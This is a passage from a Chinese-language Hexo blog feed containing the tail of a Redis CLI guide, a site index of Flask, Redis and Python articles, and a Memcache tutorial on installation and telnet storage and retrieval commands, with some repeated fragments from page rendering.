-r is used, waits <interval> seconds per command.               It is possible to specify sub-second times like -i 0.1.-n <db>            Database number.-x                 Read last argument from STDIN.-d <delimiter>     Multi-bulk delimiter in for raw formatting (default: \n).-c                 Enable cluster mode (follow -ASK and -MOVED redirections).--raw              Use raw formatting for replies (default when STDOUT is               not a tty).--no-raw           Force formatted output even when STDOUT is not a tty.--csv              Output in CSV format.--stat             Print rolling stats about server: mem, clients, ...--latency          Enter a special mode continuously sampling latency.               If you use this mode in an interactive session it runs               forever displaying real-time stats. Otherwise if --raw or               --csv is specified, or if you redirect the output to a non               TTY, it samples the latency for 1 second (you can use               -i to change the interval), then produces a single output               and exits.--latency-history  Like --latency but tracking latency changes over time.               Default time interval is 15 sec. Change it using -i.--latency-dist     Shows latency as a spectrum, requires xterm 256 colors.               Default time interval is 1 sec. Change it using -i.--lru-test <keys>  Simulate a cache workload with an 80-20 distribution.--replica          Simulate a replica showing commands received from the master.--rdb <filename>   Transfer an RDB dump from remote server to local file.--pipe             Transfer raw Redis protocol from stdin to server.--pipe-timeout <n> In --pipe mode, abort with error if after sending all data.               no reply is received within <n> seconds.               Default timeout: 30. Use 0 to wait forever.--bigkeys          Sample Redis keys looking for keys with many elements (complexity).--memkeys          Sample Redis keys looking for keys consuming a lot of memory.--memkeys-samples <n> Sample Redis keys looking for keys consuming a lot of memory.               And define number of key elements to sample--hotkeys          Sample Redis keys looking for hot keys.               only works when maxmemory-policy is *lfu.--scan             List all keys using the SCAN command.--pattern <pat>    Useful with --scan to specify a SCAN pattern.--intrinsic-latency <sec> Run a test to measure intrinsic system latency.               The test will run for the specified amount of seconds.--eval <file>      Send an EVAL command using the Lua script at <file>.--ldb              Used with --eval enable the Redis Lua debugger.--ldb-sync-mode    Like --ldb but uses the synchronous Lua debugger, in               this mode the server is blocked and script changes are               not rolled back from the server memory.--cluster <command> [args...] [opts...]               Cluster Manager command and arguments (see below).--verbose          Verbose mode.--no-auth-warning  Don't show warning message when using password on command               line interface.--help             Output this help and exit.--version          Output version and exit.[root@localhost src]# ./redis-cli127.0.0.1:6379> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="6-关闭redis"><a href="#6-关闭redis" class="headerlink" title="6.关闭redis"></a>6.关闭<code>redis</code></h3><blockquote><p>强行关闭<code>redis</code> 可能会导致数据丢失,应该使用客户端工具关闭<code>redis</code></p><pre class="line-numbers language-shell"><code class="language-shell">[root@localhost src]# ./redis-cli shutdown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>置顶! 如何阅读本站</title>
      <link href="/posts/34409.html"/>
      <url>/posts/34409.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>所有的插件,官网请<a href="https://wenyan.online/navigate/" target="_blank" rel="noopener">访问</a><code>https://wenyan.online/navigate/</code></p></blockquote><h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><h3 id="Flask视图和URL"><a href="#Flask视图和URL" class="headerlink" title="Flask视图和URL"></a>Flask视图和URL</h3><h3 id="Jinja2模板"><a href="#Jinja2模板" class="headerlink" title="Jinja2模板"></a>Jinja2模板</h3><blockquote><p><a href="https://wenyan.online/2020/09/21/jquerylearn/" target="_blank" rel="noopener">jQuery学习</a></p></blockquote><h3 id="Flask高级视图"><a href="#Flask高级视图" class="headerlink" title="Flask高级视图"></a>Flask高级视图</h3><h3 id="Flask数据库"><a href="#Flask数据库" class="headerlink" title="Flask数据库"></a>Flask数据库</h3><h3 id="Flask进阶"><a href="#Flask进阶" class="headerlink" title="Flask进阶"></a>Flask进阶</h3><blockquote><p><a href>1.WTForms</a></p><p><a href>2.上传文件</a></p><p><a href="https://wenyan.online/2020/09/23/flaskform/" target="_blank" rel="noopener">3.Flask表单验证</a></p><p><a href="https://wenyan.online/2020/09/24/flask-cookie/" target="_blank" rel="noopener">4.Cookie</a></p><p><a href="https://wenyan.online/2020/09/24/flask-session/" target="_blank" rel="noopener">5.Session</a></p><p><a href="https://wenyan.online/2020/10/18/flask-csrfd/" target="_blank" rel="noopener">6.CSRF攻击防护</a></p><p><a href="https://wenyan.online/2020/10/19/flask-shang-xia-wen/" target="_blank" rel="noopener">7.Flask上下文</a></p><p><a href>8.Flask启动流程</a></p><p><a href="https://wenyan.online/2020/10/21/flaskmail/" target="_blank" rel="noopener">9.Flask_Mail</a></p><p><a href="https://wenyan.online/2020/10/27/flask-you-xiang-yan-zheng/" target="_blank" rel="noopener">10.Flask邮箱注册验证</a></p><p><a href="https://wenyan.online/2020/10/29/flask-itsdangerous/" target="_blank" rel="noopener">11.Flask签名itsdangerous</a></p><p><a href="https://wenyan.online/2020/10/29/flask-blinker/" target="_blank" rel="noopener">12.Flask信号</a></p><p><a href="https://wenyan.online/2020/11/05/flaskrestful/" target="_blank" rel="noopener">13.Flask Restful</a></p><p><a href="https://wenyan.online/2020/11/26/flask-bootstrap-learn/" target="_blank" rel="noopener">14.Flask_Bootstrap</a></p></blockquote><hr><h2 id="Memcache"><a href="#Memcache" class="headerlink" title="Memcache"></a>Memcache</h2><blockquote><p><a href="https://wenyan.online/2020/09/27/flaskmemcache/" target="_blank" rel="noopener">Python操作Memecache</a></p></blockquote><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><blockquote><p><a href="https://wenyan.online/2020/09/27/redis1/" target="_blank" rel="noopener">1.redis安装配置</a></p><p><a href="https://wenyan.online/2020/09/28/redis2/" target="_blank" rel="noopener">2.redis客户端配置</a></p><p><a href="https://wenyan.online/2020/09/29/redis3/" target="_blank" rel="noopener">3.redis数据类型</a></p><p><a href="https://wenyan.online/2020/09/29/redis3/" target="_blank" rel="noopener">4.redis关键字key</a></p><p><a href="https://wenyan.online/2020/09/29/redis3/" target="_blank" rel="noopener">5.redis数据类型string</a></p><p><a href="https://wenyan.online/2020/10/12/redis6/" target="_blank" rel="noopener">6.redis数据类型hash</a></p><p><a href="https://wenyan.online/2020/10/12/redis7/" target="_blank" rel="noopener">7.redis数据类型list</a></p><p><a href="https://wenyan.online/2020/10/13/redis8/" target="_blank" rel="noopener">8.redis数据类型set</a></p><p><a href="https://wenyan.online/2020/10/13/redis9/" target="_blank" rel="noopener">9.reids数据类型zset</a></p><p><a href="https://wenyan.online/2020/10/13/redis10/" target="_blank" rel="noopener">10.python操作redis</a></p><p><a href="https://wenyan.online/2020/10/16/redis11/" target="_blank" rel="noopener">11,redis订阅发布</a></p><p><a href="https://wenyan.online/2020/10/18/redis12/" target="_blank" rel="noopener">12.redis事务</a></p><p><a href="https://wenyan.online/2020/10/18/redis13/" target="_blank" rel="noopener">13.reids连接</a></p></blockquote><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h3><blockquote><p><a href="https://wenyan.online/2020/09/26/python-jin-cheng-xian-cheng-1/" target="_blank" rel="noopener">1.基本概念</a></p><p>2.基于进程的并行</p><p><a href>2.1 进程的创建</a></p><p><a href="https://wenyan.online/2020/09/29/python-jin-cheng-xian-cheng-3/" target="_blank" rel="noopener">2.2 守护进程/后台进程</a></p><p><a href="https://wenyan.online/2020/09/29/python-jin-cheng-xian-cheng-4/" target="_blank" rel="noopener">2.3 杀死进程</a></p><p><a href="https://wenyan.online/2020/10/12/python-jin-cheng-xian-cheng-5/" target="_blank" rel="noopener">2.4 自定义进程子类</a></p><p>2.5 进程之间交换数据对象</p><p><a href="https://wenyan.online/2020/10/15/python-jin-cheng-xian-cheng-6/" target="_blank" rel="noopener">2.5.1 使用queue队列交换对象</a></p><p><a href="https://wenyan.online/2020/10/22/python-jin-cheng-xian-cheng-7/" target="_blank" rel="noopener">2.5.2 使用pipe交换对象</a></p><p><a href="https://wenyan.online/2020/10/27/python-jin-cheng-xian-cheng-8/" target="_blank" rel="noopener">2.5.3 使用同步原语交换数据</a></p><p><a href="https://wenyan.online/2020/11/03/python-jin-cheng-xian-cheng-9/" target="_blank" rel="noopener">2.5.4 共享内存</a></p><p><a href="https://wenyan.online/2020/11/03/python-jin-cheng-xian-cheng-10/" target="_blank" rel="noopener">2.5.5 同步异步,阻塞非阻塞</a></p><p><a href="https://wenyan.online/2020/11/03/python-jin-cheng-xian-cheng-11/" target="_blank" rel="noopener">2.5.6 进程池</a></p><p>3.基于线程的并行</p><p><a href="https://wenyan.online/2020/11/03/python-jin-cheng-xian-cheng-12/" target="_blank" rel="noopener">3.1.1 介绍</a></p><p><a href="https://wenyan.online/2020/11/03/python-jin-cheng-xian-cheng-13/" target="_blank" rel="noopener">3.2.2 Python对多线程的支持</a></p><p><a href="https://wenyan.online/2020/11/03/python-jin-cheng-xian-cheng-14/" target="_blank" rel="noopener">3.2.3 使用Rlock进行线程同步</a></p><p><a href="https://wenyan.online/2020/11/03/python-jin-cheng-xian-cheng-15/" target="_blank" rel="noopener">3.3.4 使用条件进行线程同步</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 本站文章集合 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> Python </tag>
            
            <tag> Memcache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Memecache及Python操作Memcache</title>
      <link href="/posts/51988.html"/>
      <url>/posts/51988.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-14/1600096765838-10294.png" alt="10294"></p><h2 id="Memcache"><a href="#Memcache" class="headerlink" title="Memcache"></a><code>Memcache</code></h2><h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><blockquote><p><code>Memcache</code> 是一个高性能,分布式内存对象缓存系统.</p><p>它的存储形式是基于内存的<code>key-value</code> 的形式,用来存储小块的任意数据(字符串,对象等).这些数据可以被数据库调用,<code>API</code> 调用,或者是页面渲染.一般使用的目的是,通过缓存数据库查询结果,减少数据库访问次数,以提高动态<code>web</code> 应用响应的速度,提高可扩展性.</p></blockquote><h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h3><blockquote><p>根据<a href="https://memcached.org/downloads" target="_blank" rel="noopener">官网</a>推荐的方式安装.</p><pre class="line-numbers language-shell"><code class="language-shell"># 安装依赖$ yum install -y libevent libevent-dev $ yum install -y perl-Test-Simple$ wget http://memcached.org/latest$ tar -zxvf memcached-1.5.20.tar.gz$ cd memcached-1.5.20$ ./configure --prefix=/usr/local/memcached    配置安装目录$ make$ make test  $ sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>如果<code>make test</code> 报错,是因为没有安装<code>Perl-Test-Simple</code> 模块.需要主动安装.<a href="https://github.com/memcached/memcached/issues/580" target="_blank" rel="noopener">参照</a>.</li></ul><p>将<code>memcache</code> 命令添加到系统环境中.</p><pre class="line-numbers language-bash"><code class="language-bash">$ vim ~/.bash_profilePATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$HOME</span>/bin:/var/mysql/bin:/usr/local/memcached/bin/<span class="token function">export</span> PATH$ <span class="token function">source</span> ~/.bash_profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看<code>memcache</code> 命令帮助</p><pre class="line-numbers language-shell"><code class="language-shell">[root@localhost ~]# memcached -hmemcached 1.5.20-d  启动一个守护进程,不会阻塞主进程.-m 分配给Memcache使用的内存数量,单位是 MB-u  运行Memcache的用户-l  监听的服务器IP地址,可以指定多个-p 指定监听的端口,默认是11211-c 最大运行的并发连接数,默认是 1024-P  设置保存Memcache的PID文件.-v  打印错误和警报-vv  非常冗长,打印错误和警报,同时打印客户端命令和响应.-vvv  非常冗长,除了以上,还会打印出服务器内部状态的转换.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行服务:</p><ul><li>作为前台进程运行(不是守护进程)</li></ul><pre class="line-numbers language-shell">$  memcached -u root -l 192.168.0.101 -p 11211 -m 64</code></pre><ul><li>作为守护进程运行</li></ul><pre><code class="shell">$ memcached -u root -l 192.168.0.101 -p 11211 -m 64 -d </code></pre><p>关闭服务:直接<code>kill</code> 进程即可</p><pre><code class="shell"><code class="language-shell">$  memcached -u root -l 192.168.0.101 -p 11211 -m 64</code></pre><ul><li>作为守护进程运行</li></ul><pre><code class="shell">$ memcached -u root -l 192.168.0.101 -p 11211 -m 64 -d </code></pre><p>关闭服务:直接<code>kill</code> 进程即可</p><pre><code class="shell">[root@localhost ~]# memcached -u root -l 192.168.0.101 -p 11211 -m 64 -d [root@localhost ~]# ps aux | grep memcachedroot      54058  0.0  0.0 413832  1076 ?     memcached -u root -l 192.168.0.101 -p 11211 -m 64 -d[root@localhost ~]# kill -9 54058<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-Memcache-连接"><a href="#3-Memcache-连接" class="headerlink" title="3.Memcache 连接"></a>3.<code>Memcache</code> 连接</h3><blockquote><p>可以通过<code>Telnet</code> 的方式来连接到<code>Memcache</code> 服务器.</p><pre class="line-numbers language-shell"><code class="language-shell">$ telnet HOST PORT$ telnet 192.168.0.101 11211<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="4-存储命令"><a href="#4-存储命令" class="headerlink" title="4.存储命令"></a>4.存储命令</h3><h4 id="1-Memcache-set-命令"><a href="#1-Memcache-set-命令" class="headerlink" title="1.Memcache set 命令"></a>1.<code>Memcache set</code> 命令</h4><blockquote><p><code>set</code> 命令用于将<code>value</code> 存储在指定的<code>key</code> 中.如果<code>key</code> 已经存在,则会更新该<code>key</code> 的数据.</p><p>语法:</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">key</span> flags exptime bytes <span class="token punctuation">[</span>noreply<span class="token punctuation">]</span><span class="token keyword">value</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>set</code> 关键字</li><li><code>flags</code>:可以包括键值对的整数类型,客户机使用它存储关于键值对的额外信息.<code>0</code>表示不需要压缩.</li><li><code>exptime</code>:过期时间(以秒为单位,<code>o</code> 表示永远)</li><li><code>bytes</code>:在缓存中存储的字节数,指定的数目必须和<code>value</code> 的字节数相同.</li><li><code>noreplay</code>:可选,该参数告知服务器不需要返回数据.</li><li><code>value</code> :存储数据,始终位于第二行,<code>key-value</code> 中的<code>value</code> .</li></ul><p>实例:</p><pre class="line-numbers language-shell"><code class="language-shell">❯ telnet 192.168.0.101 11211Trying 192.168.0.101...Connected to 192.168.0.101.Escape character is '^]'.set name 0 900 9    memcachedSTOREDget nameVALUE name 0 9memcachedENDset dsfsdfERRORquitConnection closed by foreign host.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在以上的输出中</p><ul><li><code>STORED</code>:保存成功后输出.</li><li><code>ERROR</code>:在保存失败后输出.</li></ul></blockquote><h4 id="2-Memcache-add-命令"><a href="#2-Memcache-add-命令" class="headerlink" title="2.Memcache add 命令"></a>2.<code>Memcache add</code> 命令</h4><blockquote><p><code>add</code> 命令用于将<code>value</code> 存储在指定的<code>key</code> 中.如果<code>key</code> 已经存在,则不会更新数据并返回<code>NOT_STORED</code>状态.(过期的<code>key</code> 会更新数据.).</p><p>语法:</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">add</span>  <span class="token keyword">key</span>  flags exptime bytes <span class="token punctuation">[</span>noreply<span class="token punctuation">]</span><span class="token keyword">value</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>add</code> 关键字</li><li><code>flags</code>:可以包括键值对的整数类型,客户机使用它存储关于键值对的额外信息.</li><li><code>exptime</code>:过期时间(以秒为单位,<code>o</code> 表示永远)</li><li><code>bytes</code>:在缓存中存储的字节数.指定的数目必须和<code>value</code> 的字节数相同.</li><li><code>noreplay</code>:可选,该参数告知服务器不需要返回数据.</li><li><code>value</code> :存储数据,始终位于第二行,<code>key-value</code> 中的<code>value</code> .</li></ul><p>实例:</p><pre class="line-numbers language-shell"><code class="language-shell">❯ telnet 192.168.0.101 11211Trying 192.168.0.101...Connected to 192.168.0.101.Escape character is '^]'.add new_key 0 900 10date_valueSTOREDget new_keyVALUE new_key 0 10date_valueENDadd new_key 0 900 10test_valueNOT_STOREDquitConnection closed by foreign host.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-Memcached-replace命令"><a href="#3-Memcached-replace命令" class="headerlink" title="3.Memcached replace命令"></a>3.<code>Memcached replace</code>命令</h4><blockquote><p><code>replace</code> 命令用于替换已经存在的<code>key</code> 的<code>value</code> .如果<code>key</code> 不存在,则替换失败,并返回<code>NOT_STORED</code> .</p><p>语法:</p><pre class="line-numbers language-sql"><code class="language-sql">replace <span class="token keyword">key</span> flags exptime bytes <span class="token punctuation">[</span>noreply<span class="token punctuation">]</span><span class="token keyword">value</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>replace</code> 关键字</li><li><code>flags</code>:可以包括键值对的整数类型,客户机使用它存储关于键值对的额外信息.</li><li><code>exptime</code>:过期时间(以秒为单位,<code>o</code> 表示永远)</li><li><code>bytes</code>:在缓存中存储的字节数.指定的数目必须和<code>value</code> 的字节数相同.</li><li><code>noreplay</code>:可选,该参数告知服务器不需要返回数据.</li><li><code>value</code> :存储数据,始终位于第二行,<code>key-value</code> 中的<code>value</code> .</li></ul><p>实例:</p><pre class="line-numbers language-shell"><code class="language-shell">❯ telnet 192.168.0.101 11211Trying 192.168.0.101...Connected to 192.168.0.101.Escape character is '^]'.add mykey 0 900 10 date_valueSTOREDget mykeyVALUE mykey 0 10date_valueENDreplace mykey 0 900 16some_other_valueSTOREDget mykeyVALUE mykey 0 16some_other_valueENDrepalce no_key 0 900 10ERRORquitConnection closed by foreign host.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="4-Memcache-append"><a href="#4-Memcache-append" class="headerlink" title="4.Memcache append"></a>4.<code>Memcache append</code></h4><blockquote><p><code>append</code> 用于对已经存在的<code>key</code> 的<code>value</code> 后面追加数据.</p><p>语法:</p><pre class="line-numbers language-sql"><code class="language-sql">append <span class="token keyword">key</span> flags exptime bytes <span class="token punctuation">[</span>noreply<span class="token punctuation">]</span><span class="token keyword">value</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>append</code> 关键字</li><li><code>flags</code>:可以包括键值对的整数类型,客户机使用它存储关于键值对的额外信息.</li><li><code>exptime</code>:过期时间(以秒为单位,<code>o</code> 表示永远)</li><li><code>bytes</code>:在缓存中存储的字节数.指定的数目必须和<code>value</code> 的字节数相同.</li><li><code>noreplay</code>:可选,该参数告知服务器不需要返回数据.</li><li><code>value</code> :存储数据,始终位于第二行,<code>key-value</code> 中的<code>value</code> .</li></ul><p>实例:</p><pre class="line-numbers language-shell"><code class="language-shell">❯ telnet 192.168.0.101 11211Trying 192.168.0.101...Connected to 192.168.0.101.Escape character is '^]'.set name 0 900 9memcachedSTOREDget nameVALUE name 0 9memcachedENDappend name 0 900 5radisSTOREDget nameVALUE name 0 14memcachedradisENDquitConnection closed by foreign host.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它相当的于对存在的<code>value</code> 追加了一段数据.</p></blockquote><h4 id="5-Memcache-prepend"><a href="#5-Memcache-prepend" class="headerlink" title="5.Memcache prepend"></a>5.<code>Memcache prepend</code></h4><blockquote><p><code>prepend</code> 用于对已经存在的<code>key</code> 的<code>value</code> 前面追加数据</p><p>语法</p><pre class="line-numbers language-sql"><code class="language-sql">prepend <span class="token keyword">key</span> flags exptime bytes <span class="token punctuation">[</span>noreply<span class="token punctuation">]</span><span class="token keyword">value</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>prepend</code> 关键字</li><li><code>flags</code>:可以包括键值对的整数类型,客户机使用它存储关于键值对的额外信息.</li><li><code>exptime</code>:过期时间(以秒为单位,<code>o</code> 表示永远)</li><li><code>bytes</code>:在缓存中存储的字节数.指定的数目必须和<code>value</code> 的字节数相同.</li><li><code>noreplay</code>:可选,该参数告知服务器不需要返回数据.</li><li><code>value</code> :存储数据,始终位于第二行,<code>key-value</code> 中的<code>value</code> .</li></ul><p>实例:</p><pre class="line-numbers language-shell"><code class="language-shell">❯ telnet 192.168.0.101 11211Trying 192.168.0.101...Connected to 192.168.0.101.Escape character is '^]'.set name 0 900 9memcachedSTOREDget nameVALUE name 0 9memcachedENDprepend name 0 900 5radisSTOREDget nameVALUE name 0 14radismemcachedENDquitConnection closed by foreign host.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="6-Memcached-cas"><a href="#6-Memcached-cas" class="headerlink" title="6.Memcached cas"></a>6.<code>Memcached cas</code></h4><blockquote><p><code>cas(check-and-set\compare-and-swap)</code> :用于执行一个检查并设置的操作,它仅仅在当前客户端最后一次取值后,该<code>key</code> 对应的值没有被其他客户端修改的情况下,才能写入.</p><p>检查是<code>cas_token</code> 参数进行的,这个参数是<code>Memcache</code>指定给已经存在的元素的一个唯一的<code>64</code> 位值.</p><p>语法:</p><pre class="line-numbers language-sql"><code class="language-sql">cas <span class="token keyword">key</span> flags exptime bytes unique_cas_token <span class="token punctuation">[</span>noreply<span class="token punctuation">]</span><span class="token keyword">value</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>cas</code> 关键字</li><li><code>flags</code>:可以包括键值对的整数类型,客户机使用它存储关于键值对的额外信息.</li><li><code>exptime</code>:过期时间(以秒为单位,<code>o</code> 表示永远)</li><li><code>bytes</code>:在缓存中存储的字节数.指定的数目必须和<code>value</code> 的字节数相同.</li><li><code>unique_cas_token</code>:通过<code>gets</code> 命令获取的一个唯一的值</li><li><code>noreplay</code>:可选,该参数告知服务器不需要返回数据.</li><li><code>value</code> :存储数据,始终位于第二行,<code>key-value</code> 中的<code>value</code></li></ul><p>实例:</p><ol><li>如果没有<code>unique_cas_token</code> ,则<code>cas</code> 命令执行错误.</li><li>如果<code>key</code> 不存在,执行失败.</li><li>添加键值对</li><li>通过<code>gets</code> 获取<code>token</code></li><li>使用<code>cas</code> 更新数据</li><li>使用<code>get</code> 查看数据</li></ol><pre class="line-numbers language-shell"><code class="language-shell">❯ telnet 192.168.0.101 11211Trying 192.168.0.101...Connected to 192.168.0.101.Escape character is '^]'.cas tp 0 900 9ERROR         # 没有token 报错cas tp 0 9000 9 2memcachedNOT_FOUND  # key 不存在报错# 生成一个tpset tp 0 900 9 memcachedSTOREDget tpVALUE tp 0 9memcachedEND# 获取token==> 10gets tp VALUE tp 0 9 10memcachedEND# 更新tpcas tp 0 900 5 10radisSTOREDget tpVALUE tp 0 5radisENDquitConnection closed by foreign host.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="7-比较"><a href="#7-比较" class="headerlink" title="7.比较"></a>7.比较</h4><blockquote><p><code>add/set/replace</code> 使用的场合不同</p><table><thead><tr><th>方法</th><th><code>key</code> 存在</th><th><code>key</code> 不存在</th></tr></thead><tbody><tr><td><code>set</code></td><td>替换</td><td>创建</td></tr><tr><td><code>add</code></td><td>报错</td><td>创建</td></tr><tr><td><code>replace</code></td><td>替换</td><td>报错</td></tr><tr><td><code>append</code></td><td><code>value</code>后方追加数据</td><td>报错</td></tr><tr><td><code>prepend</code></td><td><code>value</code>前方追加数据</td><td>报错</td></tr></tbody></table><p><code>set</code> 相当于<code>add</code> 和<code>replace</code> 的集合体.</p></blockquote><h3 id="5-查找命令"><a href="#5-查找命令" class="headerlink" title="5.查找命令"></a>5.查找命令</h3><h4 id="1-Memcache-get"><a href="#1-Memcache-get" class="headerlink" title="1.Memcache get"></a>1.<code>Memcache get</code></h4><blockquote><p><code>get</code> 用于获取<code>key</code> 中的<code>value</code>,如果<code>key</code> 不存在,返回为空.</p><p>语法:</p><pre class="line-numbers language-sql"><code class="language-sql">get <span class="token keyword">key</span><span class="token comment" spellcheck="true">/*多个值之间用空格隔开 */</span>get key1<span class="token punctuation">,</span>key2<span class="token punctuation">,</span>key3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-Memcache-gets"><a href="#2-Memcache-gets" class="headerlink" title="2.Memcache gets"></a>2.<code>Memcache gets</code></h4><blockquote><p><code>gets</code> 用户获取<code>cas</code> 令牌中的<code>value</code> ,如果<code>key</code> 不存在,返回为空.</p><p>语法:</p><pre class="line-numbers language-sql"><code class="language-sql">gets <span class="token keyword">key</span><span class="token comment" spellcheck="true">/*多个值之间用空格隔开 */</span>gets key1<span class="token punctuation">,</span>key2<span class="token punctuation">,</span>key3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-Memcache-delete"><a href="#3-Memcache-delete" class="headerlink" title="3.Memcache delete"></a>3.<code>Memcache delete</code></h4><blockquote><p><code>delete</code> 用于删除已经存在的<code>key&#39;</code> .</p><p>语法:</p><pre class="line-numbers language-sql">delete key [noreply]</code></pre></blockquote><h4 id="4-Memcache-incr-decr"><a href="#4-Memcache-incr-decr" class="headerlink" title="4.Memcache incr/decr"></a>4.<code>Memcache incr/decr</code></h4><blockquote><p><code>incr/decr</code> 用于对已经存在的<code>key</code> 的数字值进行自增/自减操作.它操作的数据必须是十进制的32位无符号整数.</p><p>如果<code>key</code> 不存在返回<code>NOT_FOUND</code> ,如果<code>key</code> 不是数字,返回<code>CLIENT_ERROR</code>,其他错误返回<code>ERROR</code>.</p><p>语法:</p><pre><code class="sql">incr/decr key increment_value</code></pre><ul><li><code>incr</code> 增加.<code>decr</code> 减少.</li><li><code>increment_value</code> :增加的数值.</li></ul></blockquote><h3 id="6-统计命令"><a href="#6-统计命令" class="headerlink" title="6.统计命令"></a>6.统计命令</h3><h4 id="1-Memcache-stats"><a href="#1-Memcache-stats" class="headerlink" title="1.Memcache stats"></a>1.<code>Memcache stats</code></h4><blockquote><p>返回统计信息,如<code>PID</code> ,版本号,连接数等.</p><pre><code class="shell"><code class="language-sql">delete key [noreply]</code></pre></blockquote><h4 id="4-Memcache-incr-decr"><a href="#4-Memcache-incr-decr" class="headerlink" title="4.Memcache incr/decr"></a>4.<code>Memcache incr/decr</code></h4><blockquote><p><code>incr/decr</code> 用于对已经存在的<code>key</code> 